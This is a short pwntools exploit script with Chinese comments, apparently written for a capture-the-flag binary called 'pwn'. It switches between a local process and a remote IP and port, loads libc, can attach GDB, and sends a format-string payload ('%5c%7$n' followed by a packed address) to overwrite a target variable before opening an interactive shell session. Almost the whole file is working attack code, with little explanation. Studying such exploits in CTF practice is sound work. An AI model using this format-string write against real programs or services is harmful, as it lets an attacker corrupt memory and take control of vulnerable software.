from kk import*
context.binary = elf = ELF('./pwn')
context.log_level = 'debug'

# 根据是否远程自动选择 libc
if args.LIBC:
    libc = ELF('./libc.so.6')  # 远程给的libc
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') #记得改

rop = ROP(elf)

def go():
    if args.KK:
        return remote('120.26.60.25', 20204)
    else:
        return process(elf.path)

def pwn():
    p = go()

    # 如果带有 GDB 参数，则附加调试器
    if args.GDB:
        # 这里可以写默认的断点，比如 b main\nc
        GDB(p, 'vmmap')

    # ================= 你的利用代码写这里 =================
    key = 0x404040
    payload = b"%5c%7$n".ljust(8, b'\x00') + p64(key)
    p.send(payload)


    # ======================================================

    p.interactive()

if __name__ == "__main__":
    pwn()